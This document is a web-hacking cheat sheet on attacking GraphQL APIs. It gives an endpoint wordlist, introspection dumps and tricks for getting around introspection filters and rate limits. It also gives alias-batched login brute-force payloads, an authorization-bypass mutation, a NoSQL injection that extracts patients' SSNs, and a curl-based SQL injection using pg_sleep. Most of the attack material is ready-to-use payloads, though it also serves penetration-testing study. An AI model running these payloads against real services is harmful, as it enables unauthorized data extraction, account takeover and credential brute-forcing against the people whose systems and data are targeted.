# GraphQL
GraphQL acts as an alternative to REST API. Rest APIs require the client to send multiple requests to different endpoints on the API to query data from the backend database. With graphQL you only need to send one request to query the backend. 

![1](https://github.com/Mehdi0x90/Web_Hacking/assets/17106836/dd83cde1-0a37-4be5-9026-cb09fa32ad8c)

### Fingerprint
The tool [graphw00f](https://github.com/dolevf/graphw00f) is capable to detect wich GraphQL engine is used in a server and then prints some helpful information for the security auditor.

## Enumeration
### Universal queries
If you send `query{__typename}` to any GraphQL endpoint, it will include the string `{"data": {"__typename": "query"}}` somewhere in its response. This is known as a universal query, and is a useful tool in probing whether a URL corresponds to a GraphQL service.

The query works because every GraphQL endpoint has a reserved field called `__typename` that returns the queried object's type as a string.

## Common GraphQL endpoints
Most of the time the graphql is located on the `/graphql` or `/graphiql` endpoint.


```html
altair
explorer
graphiql
graphiql.css
graphiql/finland
graphiql.js
graphiql.min.css
graphiql.min.js
graphiql.php
graphql
graphql/console
graphql-explorer
graphql.php
graphql/schema.json
graphql/schema.xml
graphql/schema.yaml
playground
subscriptions
api/graphql
graph
v1/altair
v1/explorer
v1/graphiql
v1/graphiql.css
v1/graphiql/finland
v1/graphiql.js
v1/graphiql.min.css
v1/graphiql.min.js
v1/graphiql.php
v1/graphql
v1/graphql/console
v1/graphql-explorer
v1/graphql.php
v1/graphql/schema.json
v1/graphql/schema.xml
v1/graphql/schema.yaml
v1/playground
v1/subscriptions
v1/api/graphql
v1/graph
v2/altair
v2/explorer
v2/graphiql
v2/graphiql.css
v2/graphiql/finland
v2/graphiql.js
v2/graphiql.min.css
v2/graphiql.min.js
v2/graphiql.php
v2/graphql
v2/graphql/console
v2/graphql-explorer
v2/graphql.php
v2/graphql/schema.json
v2/graphql/schema.xml
v2/graphql/schema.yaml
v2/playground
v2/subscriptions
v2/api/graphql
v2/graph
v3/altair
v3/explorer
v3/graphiql
v3/graphiql.css
v3/graphiql/finland
v3/graphiql.js
v3/graphiql.min.css
v3/graphiql.min.js
v3/graphiql.php
v3/graphql
v3/graphql/console
v3/graphql-explorer
v3/graphql.php
v3/graphql/schema.json
v3/graphql/schema.xml
v3/graphql/schema.yaml
v3/playground
v3/subscriptions
v3/api/graphql
v3/graph
v4/altair
v4/explorer
v4/graphiql
v4/graphiql.css
v4/graphiql/finland
v4/graphiql.js
v4/graphiql.min.css
v4/graphiql.min.js
v4/graphiql.php
v4/graphql
v4/graphql/console
v4/graphql-explorer
v4/graphql.php
v4/graphql/schema.json
v4/graphql/schema.xml
v4/graphql/schema.yaml
v4/playground
v4/subscriptions
v4/api/graphql
v4/graph
```
> **Note**
> GraphQL services will often respond to any non-GraphQL request with a "query not present" or similar error. You should bear this in mind when testing for GraphQL endpoints.

### Basic Enumeration
Graphql usually supports `GET`, `POST` (`x-www-form-urlencoded`) and `POST`(json). Although for security it's recommended to only allow json to prevent CSRF attacks.

### Introspection
To use introspection to discover schema information, query the `__schema` field. This field is available on the root type of all queries.
```graphql
query={__schema{types{name,fields{name}}}}
```
With this query you will find the name of all the types being used:

![4](https://github.com/Mehdi0x90/Web_Hacking/assets/17106836/2564dbc1-bdf2-4498-ba47-8a668d5ca471)

```graphql
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
With this query you can extract all the types, it's fields, and it's arguments (and the type of the args). This will be very useful to know how to query the database.

![10](https://github.com/Mehdi0x90/Web_Hacking/assets/17106836/1b3080a2-bf93-409b-89c5-e3e13bfdf1c2)



### Errors
It's interesting to know if the errors are going to be shown as they will contribute with useful information.
```html
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
![5](https://github.com/Mehdi0x90/Web_Hacking/assets/17106836/34a77a38-c247-4ef3-80aa-fc4ce2707223)


### Enumerate Database Schema via Introspection
>
> If introspection is enabled but the below query doesn't run, try removing the onOperation, onFragment, and onField directives from the query structure.

```graphql
  #Full introspection query

query IntrospectionQuery {
    __schema {
        queryType {
            name
        }
        mutationType {
            name
        }
        subscriptionType {
            name
        }
        types {
         ...FullType
        }
        directives {
            name
            description
            args {
                ...InputValue
        }
        onOperation  #Often needs to be deleted to run query
        onFragment   #Often needs to be deleted to run query
        onField      #Often needs to be deleted to run query
        }
    }
}

fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
        name
        description
        args {
            ...InputValue
        }
        type {
            ...TypeRef
        }
        isDeprecated
        deprecationReason
    }
    inputFields {
        ...InputValue
    }
    interfaces {
        ...TypeRef
    }
    enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
    }
    possibleTypes {
        ...TypeRef
    }
}

fragment InputValue on __InputValue {
    name
    description
    type {
        ...TypeRef
    }
    defaultValue
}

fragment TypeRef on __Type {
    kind
    name
    ofType {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
            }
        }
    }
}
```
Inline introspection query:
```html
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
The last code line is a graphql query that will dump all the meta-information from the graphql (objects names, parameters, types...)

![2](https://github.com/Mehdi0x90/Web_Hacking/assets/17106836/72c984aa-8775-4223-87fc-e2090cad0aa5)

### Searching
You can search persons by the name and get their emails:
```graphql
{
  searchPerson(name: "John Doe") {
    email
  }
}
```
You can search persons by the name and get their subscribed films:
```graphql
{
  searchPerson(name: "John Doe") {
    email
    subscribedMovies {
      edges {
        node {
          name
        }
      }
    }
  }
}
```

### Mutations
Mutations are used to make changes in the server-side.

A mutation to create new movies inside the database can be like the following one (in this example the mutation is called addMovie):
```graphql
mutation {
  addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
    movies {
      name
      rating
    }
  }
}
```

### Enumerate Database Schema via Suggestions
When you use an unknown keyword, the GraphQL backend will respond with a suggestion related to its schema.
```html
{
  "message": "Cannot query field \"one\" on type \"Query\". Did you mean \"node\"?",
}
```
You can also try to bruteforce known keywords, field and type names using wordlists such as [Escape-Technologies/graphql-wordlist](https://github.com/Escape-Technologies/graphql-wordlist) when the schema of a GraphQL API is not accessible.
### Enumerate the types' definition
Enumerate the definition of interesting types using the following GraphQL query, replacing "User" with the chosen type
```html
{__type (name: "User") {name fields{name type{name kind ofType{name kind}}}}}
```
### Bypassing GraphQL introspection defences
If you cannot get introspection queries to run for the API you are testing, try inserting a special character after the `__schema` keyword.

When developers disable introspection, they could use a regex to exclude the `__schema` keyword in queries. You should try characters like spaces, new lines and commas, as they are ignored by GraphQL but not by flawed regex.

As such, if the developer has only excluded `__schema{`, then the below introspection query would not be excluded.
```html
 #Introspection query with newline

    {
        "query": "query{__schema
        {queryType{name}}}"
    }
```
If this doesn't work, try running the probe over an alternative request method, as introspection may only be disabled over `POST`. Try a `GET` request, or a `POST` request with a content-type of `x-www-form-urlencoded`.

The example below shows an introspection probe sent via GET, with URL-encoded parameters.
```html
# Introspection probe as GET request

GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D

```
> Note
> If an endpoint will only accept introspection queries over GET and you want to analyze the results of the query using InQL Scanner, you first need to save the query results to a file. You can then load this file into InQL, where it will be parsed as normal.

### Bypassing rate limiting using aliases
Ordinarily, GraphQL objects can't contain multiple properties with the same name. Aliases enable you to bypass this restriction by explicitly naming the properties you want the API to return. You can use aliases to return multiple instances of the same type of object in one request.

Many endpoints will have some sort of rate limiter in place to prevent brute force attacks. Some rate limiters work based on the number of HTTP requests received rather than the number of operations performed on the endpoint. Because aliases effectively enable you to send multiple queries in a single HTTP message, they can bypass this restriction.

The simplified example below shows a series of aliased queries checking whether store discount codes are valid. This operation could potentially bypass rate limiting as it is a single HTTP request, even though it could potentially be used to check a vast number of discount codes at once.
```graphql
#Request with aliased queries

    query isValidDiscount($code: Int) {
        isvalidDiscount(code:$code){
            valid
        }
        isValidDiscount2:isValidDiscount(code:$code){
            valid
        }
        isValidDiscount3:isValidDiscount(code:$code){
            valid
        }
    }
```
### GraphQL CSRF
GraphQL can be used as a vector for CSRF attacks, whereby an attacker creates an exploit that causes a victim's browser to send a malicious query as the victim user.

### How do CSRF over GraphQL vulnerabilities arise?
CSRF vulnerabilities can arise where a GraphQL endpoint does not validate the content type of the requests sent to it and no CSRF tokens are implemented.

POST requests that use a content type of `application/json` are secure against forgery as long as the content type is validated. In this case, an attacker wouldn't be able to make the victim's browser send this request even if the victim were to visit a malicious site.

However, alternative methods such as `GET`, or any request that has a content type of `x-www-form-urlencoded`, can be sent by a browser and so may leave users vulnerable to attack if the endpoint accepts these requests. Where this is the case, attackers may be able to craft exploits to send malicious requests to the API.

### Authorization in GraphQL
Many GraphQL functions defined on the endpoint might only check the authentication of the requester but not authorization.

Mutation could even lead to account takeover trying to modify other account data.
```graphql
{
  "operationName":"updateProfile",
  "variables":{"username":INJECT,"data":INJECT},
  "query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
**Bypass authorization in GraphQL**

In the below example you can see that the operation is "forgotPassword" and that it should only execute the forgotPassword query associated with it. This can be bypassed by adding a query to the end, in this case we add "register" and a user variable for the system to register as a new user.

![3](https://github.com/Mehdi0x90/Web_Hacking/assets/17106836/93bc9e50-d7c5-4a48-8067-b4a67243146a)





## Exploit
### Extract data
```html
example.com/graphql?query={TYPE_1{FIELD_1,FIELD_2}}
```
### Use mutations
Mutations work like function, you can use them to interact with the GraphQL.
```html
# mutation{signIn(login:"Admin", password:"secretp@ssw0rd"){token}}
# mutation{addUser(id:"1", name:"Dan Abramov", email:"dan@dan.com") {id name email}}
```
### GraphQL Batching Attacks
Common scenario:

* Password Brute-force Amplification Scenario
* Rate Limit bypass
* 2FA bypassing

**Query name based batching**
```graphql
{
    "query": "query { qname: Query { field1 } qname1: Query { field1 } }"
}
```
Send the same mutation several times using aliases
```graphql
mutation {
  login(pass: 1111, username: "bob")
  second: login(pass: 2222, username: "bob")
  third: login(pass: 3333, username: "bob")
  fourth: login(pass: 4444, username: "bob")
}
```







## Injections
SQL and NoSQL Injections are still possible since GraphQL is just a layer between the client and the database.
Use `$regex`, `$ne` from inside a `search` parameter.

### NOSQL injection
```graphql
{
  doctors(
    options: "{\"limit\": 1, \"patients.ssn\" :1}", 
    search: "{ \"patients.ssn\": { \"$regex\": \".*\"}, \"lastName\":\"Admin\" }")
    {
      firstName lastName id patients{ssn}
    }
}
```
### SQL injection
Send a single quote ' inside a graphql parameter to trigger the SQL injection
```html
{ 
    bacon(id: "1'") { 
        id, 
        type, 
        price
    }
}
```
Simple SQL injection inside a graphql field.
```bash
curl -X POST http://localhost:8080/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27
```

## Tools
* [GraphQL Voyager](https://apis.guru/graphql-voyager/) - Schema/object exploration

### Vulnerability
* https://github.com/gsmith257-cyber/GraphCrawler: Toolkit that can be used to grab schemas and search for sensitive data, test authorization, brute force schemas, and find paths to a given type.
* https://blog.doyensec.com/2020/03/26/graphql-scanner.html: Can be used as standalone or Burp extension.
* https://github.com/swisskyrepo/GraphQLmap: Can be used as a CLI client also to automate attacks.
* https://gitlab.com/dee-see/graphql-path-enum: Tool that lists the different ways of reaching a given type in a GraphQL schema.
* https://github.com/doyensec/inql: Burp extension for advanced GraphQL testing. The Scanner is the core of InQL v5.0, where you can analyze a GraphQL endpoint or a local introspection schema file. It auto-generates all possible queries and mutations, organizing them into a structured view for your analysis. The Attacker component lets you run batch GraphQL attacks, which can be useful for circumventing poorly implemented rate limits.

### Automatic Tests
* https://graphql-dashboard.herokuapp.com/

### Clients
* https://github.com/graphql/graphiql: GUI client
* https://altair.sirmuel.design/: GUI Client


















































































